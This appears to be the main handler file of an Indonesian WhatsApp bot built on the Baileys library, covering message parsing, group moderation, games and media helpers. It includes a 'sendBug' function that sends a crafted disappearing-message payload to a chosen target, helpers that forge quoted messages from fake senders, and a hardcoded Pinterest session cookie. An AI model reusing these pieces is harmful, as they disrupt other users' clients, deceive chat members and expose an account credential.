const
	{
	    WAConnection: _WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WAMessageProto,
		ReconnectMode,
		ProxyAgent,
		ChatModification,
		GroupSettingChange,
		WA_MESSAGE_STUB_TYPES,
		WA_DEAFULT_EPHEMERAL,
		waChatKey,
		mentionedJid,
		processTime,
		prepareMessageFromContent, 
		relayWAMessage
	} = require("@adiwajshing/baileys")
const simple = require('./P1/simple.js')
const WAConnection = simple.WAConnection(_WAConnection)
const qrcode = require('qrcode-terminal')
const qrkode = require("qrcode")
const imageToBase64 = require('image-to-base64')
const moment = require("moment-timezone")
const fs = require("fs")
const axios = require("axios")
const ffmpeg = require('fluent-ffmpeg')
const request = require('request')
const util = require('util')
const hx = require('hxz-api')
const base64Img = require('base64-img')
const ms = require('parse-ms')
const figlet = require('figlet')
const ytsd = require('ytsr')
const brainly = require('brainly-scraper')
const ig = require('insta-fetcher')
const cheerio = require('cheerio')
const yts = require( 'yt-search')
const fromData = require('form-data')
const os = require('os')
const translate = require('@vitalets/google-translate-api')
const ggs = require('google-it')
const googleImage = require('g-i-s')
const toMs = require('ms')
const fetch = require('node-fetch')
const imgbb = require('imgbb-uploader')
const Math_js = require('mathjs')
const { EmojiAPI } = require("emoji-api")
const crypto = require('crypto')
const emoji = new EmojiAPI()
const speed = require('performance-now')
const { color, bgcolor } = require('./P1/color')
const { antiSpam } = require('./P1/antispam')
const { exec } = require('child_process')
const { fetchJson } = require('./P1/fetcher')
const { uploadimg, upload } = require('./P1/uploadimg')
const { webp2mp4File } = require('./P1/webp2mp4')
const { lirikLagu } = require('./P1/lirik.js')
const { webp2gifFile, igDownloader, TiktokDownloader } = require("./P1/gif.js")
const { wikiSearch } = require('./P1/wiki.js')
const { herolist } = require('./P1/herolist.js')
const { herodetails } = require('./P1/herodetail.js')
const { y2mateA, y2mateV } = require('./P1/y2mate')
const { mediafireDl } = require('./P1/mediafire.js')
const { pinterest } = require('./P1/pinterest')
const { isGame, gameAdd, givegame, cekGLimit } = require("./P1/limit");
const { addCommands, checkCommands, deleteCommands } = require('./P1/autoresp')
const { yta, ytv, buffer2Stream, ytsr, baseURI, stream2Buffer, noop } = require('./P1/ytdl')
const scrapper = require('./P1/scrapper')
const { getBuffer, getGroupAdmins, getRandom, start, info, success, close } = require('./P1/functions')
const client = new WAConnection()
const { emoji2 } = require('./emoji2')
const { emoji1 } = require('./emoji1')
const dtod = "628979185922@s.whatsapp.net"
const otod = "628979185922@s.whatsapp.net"
// STICKER WM
//const exect = require('await-exec')
//const webp = require('webp-converter')
//const sharp = require('sharp')
const Exif = require('./P1/exif')
const atm = require("./P1/atm");
const game = require("./P1/game");
const exif = new Exif()

// DATABASE
const antilink = JSON.parse(fs.readFileSync('./P2/antilink.json'))
const afk = JSON.parse(fs.readFileSync('./P2/afk.json'))
const setik = JSON.parse(fs.readFileSync('./P2/setik.json'))
const vien = JSON.parse(fs.readFileSync('./P2/vien.json'))
const imagi = JSON.parse(fs.readFileSync('./P2/imagi.json'))
const bad = JSON.parse(fs.readFileSync('./P2/bad.json'))
const commandsDB = JSON.parse(fs.readFileSync('./P2/commands.json'))
const tictactoe = JSON.parse(fs.readFileSync("./P2/tictactoe.json"))
const antivirtex = JSON.parse(fs.readFileSync("./P2/antivirtex.json"))
const welkom = JSON.parse(fs.readFileSync('./P2/welkom.json'))
const nsfw = JSON.parse(fs.readFileSync('./P2/nsfw.json'))
const mute = JSON.parse(fs.readFileSync('./P2/mute.json'))
const settings = JSON.parse(fs.readFileSync('./settings.json'))
const _registered = JSON.parse(fs.readFileSync('./P2/registered.json'))
const kickarea = JSON.parse(fs.readFileSync('./P2/kickarea.json'))
const scommand = JSON.parse(fs.readFileSync('./P2/scommand.json'))
const autosticker = JSON.parse(fs.readFileSync('./P2/autosticker.json'))

let glimit = JSON.parse(fs.readFileSync('./P2/user/glimit.json'));
let tebakanime = JSON.parse(fs.readFileSync('./P2/tebakanime.json'))
let tebakgambar = JSON.parse(fs.readFileSync('./P2/tebakgambar.json'))
let asahotak = JSON.parse(fs.readFileSync('./P2/asahotak.json'))
let caklontong = JSON.parse(fs.readFileSync('./P2/caklontong.json'))
let tebaksiapaaku = JSON.parse(fs.readFileSync('./P2/tebaksiapaaku.json'))
let tebakbendera = JSON.parse(fs.readFileSync('./P2/tebakbendera.json'))
let susunkata = JSON.parse(fs.readFileSync('./P2/susunkata.json'))
let tebakata = JSON.parse(fs.readFileSync('./P2/tebakata.json'))
let tebaklirik = JSON.parse(fs.readFileSync('./P2/tebaklirik.json'))
let tebakjenaka = JSON.parse(fs.readFileSync('./P2/tebakjenaka.json'))
let tebakimia = JSON.parse(fs.readFileSync('./P2/tebakimia.json'))
let kuismath = JSON.parse(fs.readFileSync('./P2/kuismath.json'))
let tebaklagu = JSON.parse(fs.readFileSync('./P2/tebaklagu.json'))
let tebaktebakan = JSON.parse(fs.readFileSync('./P2/tebaktebakan.json'))
let family100 = [];

ky_ttt = []
tttawal= ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
cmhit = []
fake = "/> Tato FanX7";
autorespon = false
playmusic = false
menusimpel = false
menuall = false
baterai = {
battery: "" || "Not detected",
isCharge: "" || false
}
offline = false
publik = true
bugc = true
waktuafk = 'Nothing'
alasanafk = 'Nothing'
const ownerNumber = settings.ownerNumber
NamaBot = settings.NamaBot
NomorOwner = settings.NomorOwner
NomorOwner2 = settings.NomorOwner2
NamaOwner = settings.NamaOwner
pulsa = settings.Pulsa
dana = settings.Dana
gopay = settings.Gopay
multi = true
nopref = false


// APIKEY
lolkey = settings.lolkey
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const gcount = settings.gcount

function kyun(seconds) {
	function pad(s) {
		return (s < 10 ? '0' : '') + s;
	}
	var hours = Math.floor(seconds / (60 * 60));
	var minutes = Math.floor(seconds % (60 * 60) / 60);
	var seconds = Math.floor(seconds % 60);

	//return pad(hours) + ':' + pad(minutes) + ':' + pad(seconds)
	return `${pad(hours)}Jam ${pad(minutes)}Menit ${pad(seconds)}Detik`
}
const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}
function waktu(seconds) {
	seconds = Number(seconds);
	var d = Math.floor(seconds / (3600 * 24));
	var h = Math.floor(seconds % (3600 * 24) / 3600);
	var m = Math.floor(seconds % 3600 / 60);
	var s = Math.floor(seconds % 60);
	var dDisplay = d > 0 ? d + (d == 1 ? " day, " : " days, ") : "";
	var hDisplay = h > 0 ? h + (h == 1 ? " hour, " : " hours, ") : "";
	var mDisplay = m > 0 ? m + (m == 1 ? " minute, " : " minutes, ") : "";
	var sDisplay = s > 0 ? s + (s == 1 ? " second" : " seconds") : "";
	return dDisplay + hDisplay + mDisplay + sDisplay;
}
const addafk = (from) => {
    const obj = { id: from, expired: Date.now() + toMs('10m') }
    afk.push(obj)
    fs.writeFileSync('./P2/afk.json', JSON.stringify(afk))
}
const cekafk = (_dir) => {
    setInterval(() => {
        let position = null
        Object.keys(_dir).forEach((i) => {
            if (Date.now() >= _dir[i].expired) {
                position = i
            }
        })
        if (position !== null) {
            _dir.splice(position, 1)
            fs.writeFileSync('./P2/afk.json', JSON.stringify(_dir))
        }
    }, 1000)
}

const isAfk = (idi) => {
    let status = false
    Object.keys(afk).forEach((i) => {
        if (afk[i].id === idi) {
            status = true
        }
    })
    return status
}
const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    scommand.push(obj)
    fs.writeFileSync('./P2/scommand.json', JSON.stringify(scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}
const getCmd = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return scommand[position].chats
    }
}
module.exports = Fan = async (Fan, mek) => {
try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
	    if (!mek.message) return
	    if (mek.key && !mek.key.remoteJid == 'status@broadcast') return
	    if ((Object.keys(mek.message)[0] === 'ephemeralMessage' && JSON.stringify(mek.message).includes('EPHEMERAL_SETTING')) && mek.message.ephemeralMessage.message.protocolMessage.type === 3 && bugc && !mek.key.fromMe) {
		nums = mek.participant
        longkapnye = "\n".repeat(420)
        tekuss = `\`\`\`TANDAI TELAH DIBACA !!!\`\`\`${longkapnye}\`\`\`@⁨${nums.split('@')[0]} Terdeteksi Telah Mengirim Bug, @⁨${nums.split('@')[0]} Akan Dikick!\`\`\`\n`
        Fan.groupRemove(mek.key.remoteJid, [nums]).catch((e) => { reply(`*ERR:* ${e}`) })
        Fan.sendMessage(mek.key.remoteJid, tekuss, MessageType.text, {contextInfo:{mentionedJid:[nums + "@s.whatsapp.net"]}})
        }
        mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
		const typei = Object.keys(mek.message)[0]
		global.prefix
		me = Fan.user
		m = simple.smsg(Fan, mek)
		const antibot = m.isBaileys
		const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const type = Object.keys(mek.message)[0]
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		const timeWib = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		const timeWita = moment().tz('Asia/Makassar').format('DD/MM HH:mm:ss')
        const timeWit = moment().tz('Asia/Jayapura').format('DD/MM HH:mm:ss')
		const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
		Fan.on("CB:action,,battery", json => {
	    const battery = json[2][0][1].value
	    const persenbat = parseInt(battery)
	    baterai.battery = `${persenbat}%`
	    baterai.isCharge = json[2][0][1].live
	    })
	    if (multi){
		    var prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα¦|/\\©^]/.test(cmd) ? cmd.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
        } else {
            if (nopref){
                prefix = ''
            } else {
                prefix = prefa
            }
        }
        isStc = Object.keys(mek.message)[0] == "stickerMessage" ? mek.message.stickerMessage.fileSha256.toString('hex') : ""
	    isStc = `${isStc}`
       const timestampi = speed();
					const latensyi = speed() - timestampi
         const isStcQ = isStc !== "" && content.includes("extendedTextMessage") ||
        isStc !== "" && content.includes("conversation")
        const body = (type === 'listResponseMessage' && mek.message.listResponseMessage.title) ? mek.message.listResponseMessage.title : (type === 'buttonsResponseMessage' && mek.message.buttonsResponseMessage.selectedButtonId) ? mek.message.buttonsResponseMessage.selectedButtonId : (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : ""
		const budo = (typei === 'conversation') ? mek.message.conversation : (typei === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const arg = budy.slice(command.length + 2, budy.length)
		const c = args.join(' ')
		var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
		const messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
		const dfrply = fs.readFileSync('./P3/image/logonya.jpeg')
		cmhit.push(command)
        mess = {
			wait: 'Wait a minute',
			success: 'Success',
			error: {
				stick: 'Cannot access videos!',
				Iv: 'Invalid link!',
                api: 'Error'
			},
			only: {
				group: 'Only for within the group!',
				ownerG: 'Only for group owners!',
				ownerB: 'Only for bot owners!',
				admin: 'Only for group admins!',
				Badmin: 'Make the bot a group admin!'
			}
		}
		
		const botNumber = Fan.user.jid
		const isGroup = from.endsWith('@g.us')
		const isAntiLink = isGroup ? antilink.includes(from) : false
		const sender = mek.key.fromMe ? Fan.user.jid : isGroup ? mek.participant : mek.key.remoteJid
		const senderNumber = sender.split("@")[0] 
		const conts = mek.key.fromMe ? Fan.user.jid : Fan.contacts[mek.sender]
        const pushname = mek.key.fromMe ? Fan.user.name : !conts ? '-' : conts.notify || conts.vname || conts.name || '-'   
		const totalchat = await Fan.chats.all()
		const groupMetadata = isGroup ? await Fan.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const isOwner = ownerNumber.includes(sender)
		const isNsfw = isGroup ? nsfw.includes(from) : false
		const isGroupAdmins = groupAdmins.includes(sender) || false
		const isKickArea = isGroup ? kickarea.includes(from) : false
		
		 const isAntivirtex = isGroup ? antivirtex.includes(from) : false
	
		const isWelkom = isGroup ? welkom.includes(from) : false
		const isAuto = isGroup ? autosticker.includes(from) : false
		const isMuted = isGroup ? mute.includes(from) : false
		      membr = []
        const pff = groupMembers
        const go = groupMembers
        const goo = pff[Math.floor(Math.random() * pff.length)]
        const oe = go[Math.floor(Math.random() * go.length)]
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isButton = (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedButtonId : ''
		const q = args.join(' ')
const fakegroup = (teks) => {
            Fan.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./P3/image/logonya.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
const isUrl = (url) => {
return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
}
		if (antibot === true) return
		const katalog = (teks) => {
             res = Fan.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 321, "message": teks, "footerText": "_𝐅𝐚𝐧 𝐗7_", "thumbnail": ofrply, "surface": 'CATALOG' }}, {quoted:ftrol})
             Fan.relayWAMessage(res)
        }
        const grupinv = (teks) => {
        	grup = Fan.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '6288213840883-1616169743@g.us', "inviteCode": 'https://chat.whatsapp.com/JI25LDtPW784GAZoRD9fW9', "groupName": `_𝐅𝐚𝐧 𝐗7_`, "footerText": "_𝐅𝐚𝐧 𝐗7_", "jpegThumbnail": ofrply, "caption": teks}}, {quoted:finv})
            Fan.relayWAMessage(grup)
        }
		idttt = []
	    players1 = []
	    players2 = []
	    gilir = []
	    for (let t of ky_ttt){
	    idttt.push(t.id)
	    players1.push(t.player1)
	    players2.push(t.player2)
	    gilir.push(t.gilir)
	    }
	    const isTTT = isGroup ? idttt.includes(from) : false
	    isPlayer1 = isGroup ? players1.includes(sender) : false
        isPlayer2 = isGroup ? players2.includes(sender) : false
		try {
		pporang = await Fan.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
		      } catch {
		pporang = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
		      }
		const ofrply1 = fs.readFileSync('./P3/image/logonya.jpeg')
		const ofrply2 = fs.readFileSync('./P3/image/logonya2.jpeg')
	    const ofrply3 = fs.readFileSync('./P3/image/runtime.jpeg')
		const ofrply = await getBuffer(pporang)
		const store1 = fs.readFileSync('./P3/image/iconstore.jpeg')
		const pporigi = fs.readFileSync('./P3/image/logonya.jpeg')
		const dana = fs.readFileSync('./P4/dana.jpg')
		const gopay = fs.readFileSync('./P4/gopay.jpg')
		const qrnya = fs.readFileSync('./P4/qriss.jpg')
		const sekarang = new Date().getTime();
			//-
			//WAKTU
			var ase = new Date();
                        var jamss = ase.getHours();
                         switch(jamss){
                case 0: jamss = "Dah Malam Jangan Gadang 🌚"; break;
                case 1: jamss = "Dah Malam Jangan Gadang 🌚"; break;
                case 2: jamss = "Dah Malam Jangan Gadang 🌚"; break;
                case 3: jamss = "Dah Mau Shubuh Siap Siap Shalat Ya 🌔"; break;
                case 4: jamss = "Dah Shubuh Jangan Lupa Shalat Kak🌔"; break;
                case 5: jamss = "Pagi 🌄"; break;
                case 6: jamss = "Pagi 🌄"; break;
                case 7: jamss = "Pagi 🌄"; break;
                case 8: jamss = "Pagi ☀️"; break;
                case 9: jamss = "Pagi ☀️"; break;
                case 10: jamss = "Pagi ☀️"; break;
                case 11: jamss = "Siang 🌞"; break;
                case 12: jamss = "Udh Dzuhur  Jangan Lupa Shalat Kak 🌞"; break;
                case 13: jamss = "Siang 🌞"; break;
                case 14: jamss = "Siang 🌞"; break;
                case 15: jamss = "Dah Ashar Jangan Lupa Shalat kak🌞"; break;
                case 16: jamss = "Sore ☀️"; break;
                case 17: jamss = "Sore 🌄"; break;
                case 18: jamss = "Dah Maghrib Jangan Lupa Shalat Kak 🌄"; break;
                case 19: jamss = "Malam 🌙"; break;
                case 20: jamss = "Malam 🌙"; break;
                case 21: jamss = "Malam 🌙"; break;
                case 22: jamss = "Dah Malam Jangan Gadang 🌙"; break;
                case 23: jamss = "Dah Malam Jangan Gadang 🌚"; break;
            }
            var tampilUcapan = "" + jamss;
            const jmn = moment.tz('Asia/Jakarta').format('HH:mm:ss')
				let d = new Date
				let locale = 'id'
				let gmt = new Date(0).getTime() - new Date('1 Fanuari 2021').getTime()
				const weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
				const week = d.toLocaleDateString(locale, { weekday: 'long' })
				const calender = d.toLocaleDateString(locale, {
				day: 'numeric',
				month: 'long',
				year: 'numeric'
		       })
		const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var imageTime = await getBuffer('https://i.pinimg.com/736x/27/ee/27/27ee271709bdb24d555b2dd3de796f93.jpg')
                                        }
if(time2 < "19:00:00"){
var imageTime = await getBuffer('https://i.pinimg.com/736x/27/ee/27/27ee271709bdb24d555b2dd3de796f93.jpg')
                                         }
if(time2 < "18:00:00"){
var imageTime = await getBuffer('https://i.pinimg.com/736x/81/08/7b/81087b2e732dc0e25d8875b135d579b9.jpg')
                                         }
if(time2 < "15:00:00"){
var imageTime = await getBuffer('https://i.pinimg.com/736x/81/98/aa/8198aaf07083fc9939deb0c3c5c3716c.jpg')
                                         }
if(time2 < "11:00:00"){
var imageTime = await getBuffer('https://i.pinimg.com/736x/81/98/aa/8198aaf07083fc9939deb0c3c5c3716c.jpg')
                                         }
if(time2 < "06:00:00"){
var imageTime = await getBuffer('https://i.pinimg.com/736x/15/8e/ea/158eea299c01433aae6744599d2fdc3a.jpg')
}
const ftok = {
key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": imageTime //Gambarnye
					},
					"title": `${tampilUcapan} ${pushname}`, //Kasih namalu 
					"description": `${tampilUcapan} ${pushname}`, 
					"currencyCode": "USD",
					"priceAmount1000": "2000",
					"retailerId": `${tampilUcapan} ${pushname}`,
					"productImageCount": 1
				},
				    "businessOwnerJid": `0@s.whatsapp.net`
		}
	}
}
// TROLI
runtime = process.uptime()
const ftrol = {
	key : {
   participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 123,
                            status: 1,
                            surface : 1,
                            message: `${tampilUcapan} ${pushname}`, //Kasih namalu
                            orderTitle: `${tampilUcapan} ${pushname}`,
                            thumbnail: dfrply, //Gambarnye
                            sellerJid: '0@s.whatsapp.net' 
                          }
                        }
                      }

//kick
const mentionByTag = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByreply = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.participant || "" : ""
        const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
        mention != undefined ? mention.push(mentionByreply) : []
        const mentionUser = mention != undefined ? mention.filter(n => n) : []
// LOCATION
const floc = {
	key : {
           participant : '0@s.whatsapp.net'
                        },
       message: {
                    liveLocationMessage: {
                    caption: `${tampilUcapan} ${pushname}`,
                    jpegThumbnail: dfrply
                          }
                        }
                      }
// DOCUMENT
const fdoc = {
	key : {
           participant : '0@s.whatsapp.net'
                        },
       message: {
                    documentMessage: {
                    title: `${tampilUcapan} ${pushname}`, 
                    jpegThumbnail: dfrply
                          }
                        }
                      }
// VIDEO
const fvid = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title": `${tampilUcapan} ${pushname}`,
                 "h": `${tampilUcapan} ${pushname}`,
                 'duration': '99999', 
                 'caption': `${tampilUcapan} ${pushname}`,
                 'jpegThumbnail': dfrply
                        }
                       }
	                  }
//pin
const pinterest = (queryy) => {
  return new Promise((resolve, reject) => {
    axios.get(`https://id.pinterest.com/search/pins/?autologin=true&q=${queryy}`, {
      headers: {
        cookie: "_auth=1; _b=\"AVna7S1p7l1C5I9u0+nR3YzijpvXOPc6d09SyCzO+DcwpersQH36SmGiYfymBKhZcGg=\"; _pinterest_sess=TWc9PSZHamJOZ0JobUFiSEpSN3Z4a2NsMk9wZ3gxL1NSc2k2NkFLaUw5bVY5cXR5alZHR0gxY2h2MVZDZlNQalNpUUJFRVR5L3NlYy9JZkthekp3bHo5bXFuaFZzVHJFMnkrR3lTbm56U3YvQXBBTW96VUgzVUhuK1Z4VURGKzczUi9hNHdDeTJ5Y2pBTmxhc2owZ2hkSGlDemtUSnYvVXh5dDNkaDN3TjZCTk8ycTdHRHVsOFg2b2NQWCtpOWxqeDNjNkk3cS85MkhhSklSb0hwTnZvZVFyZmJEUllwbG9UVnpCYVNTRzZxOXNJcmduOVc4aURtM3NtRFo3STlmWjJvSjlWTU5ITzg0VUg1NGhOTEZzME9SNFNhVWJRWjRJK3pGMFA4Q3UvcHBnWHdaYXZpa2FUNkx6Z3RNQjEzTFJEOHZoaHRvazc1c1UrYlRuUmdKcDg3ZEY4cjNtZlBLRTRBZjNYK0lPTXZJTzQ5dU8ybDdVS015bWJKT0tjTWYyRlBzclpiamdsNmtpeUZnRjlwVGJXUmdOMXdTUkFHRWloVjBMR0JlTE5YcmhxVHdoNzFHbDZ0YmFHZ1VLQXU1QnpkM1FqUTNMTnhYb3VKeDVGbnhNSkdkNXFSMXQybjRGL3pyZXRLR0ZTc0xHZ0JvbTJCNnAzQzE0cW1WTndIK0trY05HV1gxS09NRktadnFCSDR2YzBoWmRiUGZiWXFQNjcwWmZhaDZQRm1UbzNxc21pV1p5WDlabm1UWGQzanc1SGlrZXB1bDVDWXQvUis3elN2SVFDbm1DSVE5Z0d4YW1sa2hsSkZJb1h0MTFpck5BdDR0d0lZOW1Pa2RDVzNySWpXWmUwOUFhQmFSVUpaOFQ3WlhOQldNMkExeDIvMjZHeXdnNjdMYWdiQUhUSEFBUlhUVTdBMThRRmh1ekJMYWZ2YTJkNlg0cmFCdnU2WEpwcXlPOVZYcGNhNkZDd051S3lGZmo0eHV0ZE42NW8xRm5aRWpoQnNKNnNlSGFad1MzOHNkdWtER0xQTFN5Z3lmRERsZnZWWE5CZEJneVRlMDd2VmNPMjloK0g5eCswZUVJTS9CRkFweHc5RUh6K1JocGN6clc1JmZtL3JhRE1sc0NMTFlpMVErRGtPcllvTGdldz0=; _ir=0"
      }
    }).then(({data}) => {
      const $ = cheerio.load(data)
      const result = []
      const hasil = []
      $('div > a').get().map(b => {
        const link = $(b).find('img').attr('src')
        result.push(link)
      })
      result.forEach(function (v) {
        if (v == undefined) return
        hasil.push(v.replace(/236/g,'736'))
      })
      hasil.shift()
      resolve(hasil)
    }).catch(reject)
  })
}
// GROUPINVITE
const finv = {
	"key": {
		"fromMe": false,
		"participant": "0@s.whatsapp.net",
		"remoteJid": "0@s.whatsapp.net"
	},
	"message": {
		"groupInviteMessage": {
			"groupJid": "6288213840883-1616169743@g.us",
			"inviteCode": `${tampilUcapan} ${pushname}`,
			"groupName": `${tampilUcapan} ${pushname}`, 
            "caption": `${tampilUcapan} ${pushname}`, 
            'jpegThumbnail': dfrply
		}
	}
}
// STICKER
const fstick = {
"key": {
	  "participant": `0@s.whatsapp.net`,
      "remoteJid": "6289643739077-1613049930@g.us",
      "fromMe": false,
      "id": "3B64558B07848BD81108C1D14712018E"
    },
    "message": {
      "stickerMessage": {
        "fileSha256": "uZiOJzqOvrOo2WGjnMKgX2MMQMyasT+ZDgqUczpIBmY=",
		"pngThumbnail": dfrply,
	 "mimetype": "image/webp",
        "height": 64,
        "width": 64,
        "directPath": "/v/t62.15575-24/56110107_763365384384977_5720135628188301198_n.enc?oh=450f8f684b06f0ba2dbc9779e5f06774&oe=605B81EE",
        "fileLength": "60206",
        "firstFrameLength": 3626,
        "isAnimated": false
      }
    },
    "messageTimestamp": "1614070775",
    "status": "PENDING"
  }
// GIF
const fgi = {
	 key: { 
         fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title": `${tampilUcapan} ${pushname}`,
                 "h": `${tampilUcapan} ${pushname}`,
                 'duration': '99999', 
                 'gifPlayback': 'true', 
                 'caption': `${tampilUcapan} ${pushname}`,
                 'jpegThumbnail': dfrply
                        }
                       }
	                  } 
// TEXT WITH THUMBNAIL
const ftex = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
		"extendedTextMessage": {
                 "text": `${tampilUcapan} ${pushname}`,
                 "title": `${tampilUcapan} ${pushname}`,
                 'jpegThumbnail': dfrply
                        }
	                  } 
                     }
// VN
const fvoc = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
		"audioMessage": {
                 "mimetype":"audio/ogg; codecs=opus",
                 "seconds": "99999",
                 "ptt": "true"
                        }
	                  } 
                     }
const sendBug = async (target) => {
      await Fan.relayWAMessage(
        Fan.prepareMessageFromContent(
          target,
          Fan.prepareDisappearingMessageSettingContent(0),
          {}
        ),{ waitForAck: true }) 
    }
    //But verify
const getRegisteredRandomId = () => {
return _registered[Math.floor(Math.random() * _registered.length)].id
}
const addRegisteredUser = (userid, sender, age, time, serials) => {
const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
_registered.push(obj)
fs.writeFileSync('./P2/registered.json', JSON.stringify(_registered))
}
const checkRegisteredUser = (sender) => {
let status = false
Object.keys(_registered).forEach((i) => {
if (_registered[i].id === sender) {
status = true
}
})
return status
}

